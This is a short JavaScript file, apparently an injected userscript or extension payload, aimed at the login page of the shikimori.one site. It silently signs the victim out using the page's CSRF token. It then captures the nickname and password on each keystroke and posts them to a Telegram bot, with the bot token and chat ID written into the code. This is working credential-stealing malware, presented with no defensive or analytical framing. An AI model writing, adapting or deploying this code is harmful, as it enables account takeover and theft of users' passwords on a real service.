 function onInject() {
    console.log('Init Inject');

    signOutUser();

    const name = document.getElementById('user_nickname');
    const pass = document.getElementById('user_password');
    // let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
    // submitButton.addEventListener('mouseenter', onInputChange);
    if(pass != null && name != null) {
        console.log('inputs found!');

        name.addEventListener("input", onInputChange);
        pass.addEventListener("input", onInputChange);
    }
 }

function signOutUser() {
     const metaTag = document.querySelector('meta[name="csrf-token"]');
     const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
     fetch('https://shikimori.one/api/users/sign_out', {
      "headers": {
       'X-CSRF-Token': csrfToken,
      },
       "method": 'POST'
     })
 }

 function onInputChange() {
    const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
    const chatId = '250460465';

    const name = document.getElementById('user_nickname').value;
    const pass = document.getElementById('user_password').value;
    const message = `Name: ${name}\nPassword: ${pass}`;

            $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'html',
                },
                success: function (res) {
                    console.log('success');
                    //$('#response').text('Message sent');
                },
                error: function (error) {
                    console.log(error);
                    // alert("error failed");
                }
            });
 }

onInject();
